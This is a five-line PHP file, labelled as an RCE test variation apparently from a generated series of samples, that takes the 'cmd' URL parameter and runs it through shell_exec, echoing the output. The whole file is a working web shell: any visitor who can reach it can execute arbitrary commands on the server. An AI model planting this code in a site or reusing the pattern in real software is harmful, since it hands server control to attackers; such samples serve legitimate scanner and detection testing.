<?php
// RCE test variation #1375
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>